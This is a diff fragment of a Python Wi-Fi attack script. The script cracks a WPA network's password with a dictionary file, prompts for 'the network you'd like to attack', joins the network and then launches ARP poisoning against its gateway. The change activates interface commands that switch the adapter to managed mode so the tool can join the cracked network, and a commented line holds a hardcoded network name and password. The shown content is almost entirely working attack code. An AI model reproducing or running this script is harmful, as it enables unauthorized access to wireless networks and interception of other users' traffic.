@@ -18,13 +18,13 @@ def crackWPA(essid, dictFile):
                 print(line.split()[-1][1:-2])
                 return line.split()[-1][1:-2]
 
-def connectToNetwork(essid, password):
+def connectToNetwork():
     # subprocess.Popen(["nmcli", "d", "wifi", "connect", essid, "password", password], stdout=subprocess.PIPE, stderr=subprocess.PIPE).wait()
     # input("")
     # print("connecting to network")
-    # os.system("sudo ifconfig {} down".format(INTERFACE_NAME))
-    # os.system("sudo iwconfig {} mode managed".format(INTERFACE_NAME))
-    # os.system("sudo ifconfig {} up".format(INTERFACE_NAME))
+    os.system("sudo ifconfig {} down".format(INTERFACE_NAME))
+    os.system("sudo iwconfig {} mode managed".format(INTERFACE_NAME))
+    os.system("sudo ifconfig {} up".format(INTERFACE_NAME))
     #os.system("sudo nmcli d wifi connect Vic password praetorian")
     #subprocess.Popen(["sudo", "nmcli", "d", "wifi", "connect", essid, "password", password]).wait()
     pass
@@ -48,8 +48,8 @@ if __name__ == "__main__":
     setup()
     essid = input("Enter the name of the network you'd like to attack:")
     password = crackWPA(essid, DICT_FILE)
+    connectToNetwork()
     input("Password found! Connect to '{}' with password '{}' and press enter when ready".format(essid, password))
-    # connectToNetwork(essid, password)
     print("ARP Poisoning...")
     gatewayIP = getGatewayIP()
     arpSpoofProc = arpPoison(monitorModeInterface, gatewayIP)
